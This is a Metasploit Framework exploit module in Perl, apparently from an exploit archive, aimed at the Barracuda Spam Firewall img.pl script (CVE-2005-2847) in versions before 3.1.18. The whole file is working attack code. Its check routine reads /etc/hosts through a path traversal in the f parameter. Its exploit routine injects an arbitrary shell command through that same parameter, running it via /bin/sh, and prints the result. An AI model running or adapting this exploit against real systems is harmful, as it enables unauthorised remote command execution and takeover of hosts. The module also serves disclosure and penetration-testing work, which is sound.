Barracuda Spam Firewall < 3.1.18 Command Execution Exploit (meta)
=================================================================





##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::barracuda_img_exec;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
	&#039;Name&#039;     => &#039;Barracuda IMG.PL Remote Command Execution&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.0 $&#039;,
	&#039;Authors&#039;  => [ &#039;Nicolas Gregoire <ngregoire@exaprobe.com>&#039; ],
	&#039;Arch&#039;     => [ &#039;x86&#039; ],
	&#039;OS&#039;       => [ &#039;linux&#039; ],
	&#039;Priv&#039;     => 0,
	&#039;UserOpts&#039; =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 8000],
		&#039;VHOST&#039; => [0, &#039;DATA&#039;, &#039;The virtual host name of the server&#039;],
		&#039;IMG&#039;   => [1, &#039;DATA&#039;, &#039;Full path of img.pl script&#039;, &#039;/cgi-bin/img.pl&#039;],
		&#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
	  },

	&#039;Description&#039; => Pex::Text::Freeform(qq{
		This module exploits an arbitrary command execution vulnerability in the
		Barracuda Spam Firewall appliance. Versions prior to  3.1.18 are vulnerable.
}),

	&#039;Refs&#039; =>
	  [
		[&#039;URL&#039;, &#039;http://www.securiweb.net/wiki/Ressources/AvisDeSecurite/2005.1&#039;],
		[&#039;CVE&#039;, &#039;2005-2847&#039;],
		[&#039;OSVDB&#039;, &#039;19279&#039;],
		[&#039;BID&#039;, &#039;14712&#039;],
		[&#039;NSS&#039;, &#039;19556&#039;],
	  ],

	&#039;Payload&#039; =>
	  {
		&#039;Space&#039; => 512,
		&#039;Keys&#039;  => [&#039;cmd&#039;],
	  },

	&#039;Keys&#039; => [&#039;barracuda&#039;],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host    = $self->GetVar(&#039;RHOST&#039;);
	my $vhost          = $self->VHost;
	my $target_port    = $self->GetVar(&#039;RPORT&#039;);
	my $img            = $self->GetVar(&#039;IMG&#039;);

	my $request =
	  "GET $img?f=%2e%2e/etc/hosts HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Host: $vhost:$target_port\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039; => $target_host,
		&#039;PeerPort&#039; => $target_port,
		&#039;SSL&#039;      => $self->GetVar(&#039;SSL&#039;),
	  );

	if ($s->IsError){
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return $self->CheckCode(&#039;Connect&#039;);
	}

	$self->PrintLine("[*] Establishing a connection to the target...");

	$s->Send($request);
	my $results = $s->Recv(-1, 20);
	$s->Close();
	
	if (($results =~ /HTTP\/1\..\s+200/) && ($results =~/127\.0\.0\.1/)) {

		$self->PrintLine("[*] Vulnerable server detected!");
		return $self->CheckCode(&#039;Confirmed&#039;);
		
	} elsif ($results =~ /HTTP\/1\..\s+([345]\d+)/) {

		$self->PrintLine("[*] The Barraccuda application was not found.");
		return $self->CheckCode(&#039;Safe&#039;);
	}

	$self->PrintLine("[*] Generic error...");
	return $self->CheckCode(&#039;Generic&#039;);
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->GetVar(&#039;RHOST&#039;);
	my $vhost          = $self->VHost;
	my $target_port    = $self->GetVar(&#039;RPORT&#039;);
	my $img            = $self->GetVar(&#039;IMG&#039;);
	my $encodedPayload = $self->GetVar(&#039;EncodedPayload&#039;);
	my $cmd            = $encodedPayload->RawPayload;

	$img = $img."?f=".$self->URLEncode(qq#../bin/sh -c "echo &#039;YYY&#039;;#. $cmd .qq#;echo &#039;YYY&#039;"|#);

	my $request =
	  "GET $img HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Host: $vhost:$target_port\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039; => $target_host,
		&#039;PeerPort&#039; => $target_port,
		&#039;SSL&#039;      => $self->GetVar(&#039;SSL&#039;),
	  );

	if ($s->IsError){
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Establishing a connection to the target...");
	$s->Send($request);
	my $results = $s->Recv(-1, 20);
	
	if ($results =~ /HTTP\/1\.. 200 OK/im) {

		(undef, $results) = split(/YYY/, $results);
		
		$self->PrintLine(&#039; &#039;);
		$self->PrintLine("$results");
		$self->PrintLine(&#039; &#039;);

		$self->PrintLine("[*] End of data.");

	} else {
		$self->PrintLine(&#039; &#039;);
		$self->PrintLine("Doh ! Are you sure this server is vulnerable ?");
	}

	$s->Close();
	return;
}

sub URLEncode {
	my $self = shift;
	my $data = shift;
	my $res;

	foreach my $c (unpack(&#039;C*&#039;, $data)) {
		if (
			($c >= 0x30 && $c <= 0x39) ||
			($c >= 0x41 && $c <= 0x5A) ||
			($c >= 0x61 && $c <= 0x7A)
		  ) {
			$res .= chr($c);
		} else {
			$res .= sprintf("%%%.2x", $c);
		}
	}
	return $res;
}

sub VHost {
	my $self = shift;
	my $name = $self->GetVar(&#039;VHOST&#039;) || $self->GetVar(&#039;RHOST&#039;);
	return $name;
}

1;



